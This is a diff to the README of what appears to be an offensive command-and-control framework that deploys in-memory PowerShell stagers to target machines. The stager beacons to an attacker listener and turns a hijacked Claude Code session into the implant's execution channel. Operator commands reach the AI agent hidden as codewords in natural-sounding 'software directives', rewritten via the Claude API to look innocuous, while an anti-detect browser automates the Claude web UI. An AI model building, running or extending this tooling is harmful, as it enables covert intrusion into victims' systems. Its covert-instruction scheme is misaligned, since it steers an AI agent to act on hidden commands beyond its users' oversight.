@@ -143,7 +143,30 @@ python build_implant.py \
 
 **Language selection:** By default, each implant randomly selects one of Python, C#, or Java for its template language. This is determined by the implant's seed for reproducibility. Use `--language` to force a specific language.
 
-### 2. Start the operator console
+### 2. Start browser with remote debugging
+
+The browser bridge needs to control a browser with an authenticated Claude session. Start Chrome or Firefox with remote debugging enabled:
+
+**Chrome (macOS):**
+```bash
+# Quit all Chrome instances first, then:
+/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --remote-debugging-port=9222
+```
+
+**Chrome (Windows):**
+```powershell
+# Close all Chrome windows first, then:
+& "C:\Program Files\Google\Chrome\Application\chrome.exe" --remote-debugging-port=9222
+```
+
+**Firefox (macOS):**
+```bash
+/Applications/Firefox.app/Contents/MacOS/firefox --remote-debugging-port=9222
+```
+
+Log into Claude (claude.ai) in that browser window before proceeding.
+
+### 3. Start the operator console
 
 ```bash
 python operator/c4_server.py --port 9050 --tcp-port 9090
@@ -159,7 +182,7 @@ python operator/c4_server.py --port 9050 --tcp-port 9090 --serve-dir implants/
 
 Files are accessible at `GET /serve/<implant-id>/<filename>` (e.g. `/serve/abc123/rc_stager_full.ps1`). A listing of all implants and their files is available at `GET /serve`.
 
-### 3. Deploy the stager
+### 4. Deploy the stager
 
 Copy `implants/<implant-id>/rc_stager_full.ps1` to the target. It contains everything needed — the implant, PshAgent, and MCP server — all loaded in-memory.
 
@@ -187,7 +210,7 @@ powershell -ExecutionPolicy Bypass -File rc_stager_full.ps1 -C2 <c2-ip>:9090
 
 The stager pre-trusts the workspace, launches a Claude Code remote-control session, and beacons the bridge URL back to the operator's TCP listener.
 
-### 4. View results
+### 5. View results
 
 The operator TUI automatically decrypts `verification_record` fields from audit responses when the implant's private key is available. Decrypted results are displayed inline in the session.
 
@@ -201,14 +224,25 @@ For manual decryption, use the operator's private key with `operator/Decrypt-Aud
 
 ### Build
 
+#### build/generate_codebook.py
+Generates `codebook.yaml` from `implant_actions.yaml`. Creates PascalCase class-name codewords for tools (50 per tool) and snake_case function-name codewords for parameters (100 per param). Word banks are drawn from software engineering terminology to look natural in generated code.
+
 #### build/derive_salt.py
 Derives the 256-bit (64-character hex) salt from the P-256 public key using HMAC-SHA256.
+
+#### build/kdf.py
+Shared key derivation function used by `derive_salt.py`. Implements the HMAC-SHA256-based salt derivation that both the Python build pipeline and the C# runtime must produce identically.
 
 #### build/encode.py
 Encodes a tool call JSON into a polymorphic software directive. Supports 7 template families across Python, C#, and Java. Each implant uses only templates from its configured language.
 
+**Enrichment mode:** When `ENRICH_API_KEY` is set, directives are enhanced via Claude API to produce more natural-sounding prompts. The enrichment adds context and variation while preserving the embedded codewords. Disabled by default; enable by exporting the API key.
+
 #### build/export_config.py
 XOR-encrypts all mappings (codewords, tools, parameters, values) into a single binary blob using the derived salt.
+
+#### build/assemble_stager.py
+Assembles the full-deploy stager by embedding base64-encoded payloads into the template. Flattens PshAgent (all PS1 files in dependency order), bakes it into the implant, bakes the implant into `mcp_server.py`, then embeds the result into the stager template. The implant and PshAgent never touch disk on the target — they're decoded into memory at runtime.
 
 ### Operator
 
@@ -216,7 +250,10 @@ XOR-encrypts all mappings (codewords, tools, parameters, values) into a single b
 TUI-based operator console (Textual/Rich). Listens for beacon check-ins on HTTP and TCP ports, provides an interactive session manager for selecting targets and issuing commands. Parses operator input, encodes it via the implant's codebook (using the implant's configured language), and delivers commands through the browser bridge or queues them for HTTP polling. Automatically decrypts `verification_record` responses using the implant's private key. Optionally serves stager files over HTTP (`--serve-dir`) for target-side retrieval.
 
 #### operator/browser_bridge.py
-Automates the Claude Code web UI using Camoufox (anti-detect Firefox via Playwright). Manages browser sessions: opens a remote-control session URL, types encoded directives into the ProseMirror editor, detects processing state (interrupt button, spinner, shimmer animation), and extracts response text from the DOM when Claude finishes. Includes heuristics to wait for complete responses before returning.
+Automates the Claude Code web UI using Camoufox (anti-detect Firefox via Playwright). Manages browser sessions: opens a remote-control session URL, types encoded directives into the ProseMirror editor, detects processing state (interrupt button, spinner, shimmer animation), and extracts response text from the DOM when Claude finishes. Includes heuristics to wait for complete responses before returning. Used when the C4 server runs on a machine with direct browser access.
+
+#### operator/browser_bridge_local.py
+WebSocket-based browser bridge for split deployments. Runs on the operator's local machine (with authenticated browser access to Claude), accepts WebSocket connections from a remote C4 server (via SSH tunnel), and executes browser automation commands. Supports connecting to an existing Chrome/Firefox instance via CDP (`--connect-existing --cdp-url`), using a persistent Chrome profile (`--chrome-profile`), or launching a fresh browser. Includes optional SSH tunnel setup (`--tunnel-to`) to expose the WebSocket port to the attacker VM.
 
 ### Stager
 
